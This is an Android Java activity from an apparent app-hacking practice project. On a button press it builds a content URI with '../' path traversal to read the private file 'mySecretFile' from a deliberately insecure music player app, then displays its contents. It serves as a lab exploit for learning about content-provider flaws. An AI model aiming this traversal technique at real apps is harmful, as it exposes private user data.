package net.ammarafzal.practice;

import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.List;

public class PathTriversal extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_path_triversal);
        TextView textView = findViewById(R.id.textView);
        Uri uri = Uri.parse("content://com.apphacking.musicplayer/../data/data/com.apphacking.musicplayer/files/mySecretFile");
        Button path_triversal = findViewById(R.id.path_triversal);
        if (path_triversal != null) {
            path_triversal.setOnClickListener((View.OnClickListener)(new View.OnClickListener() {
                public final void onClick(View it) {
                    try {
                        if(isPackageExisted("com.apphacking.musicplayer")){
                        InputStream in = getContentResolver().openInputStream(uri);
                        BufferedReader r = new BufferedReader(new InputStreamReader(in));
                        StringBuilder total = new StringBuilder();
                        for (String line; (line = r.readLine()) != null; ) {
                            total.append(line).append('\n');
                        }
                        String content = total.toString();
                        textView.append(content);
                        }
                        else{
                            Toast.makeText(PathTriversal.this, "Please install Insecure Music Player APK",
                                    Toast.LENGTH_LONG).show();
                        }

                    }catch (Exception e) {

                    }
                }
            }));
        }
    }
    public boolean isPackageExisted(String targetPackage){
        List<ApplicationInfo> packages;
        PackageManager pm;

        pm = getPackageManager();
        packages = pm.getInstalledApplications(0);
        for (ApplicationInfo packageInfo : packages) {
            if(packageInfo.packageName.equals(targetPackage))
                return true;
        }
        return false;
    }
}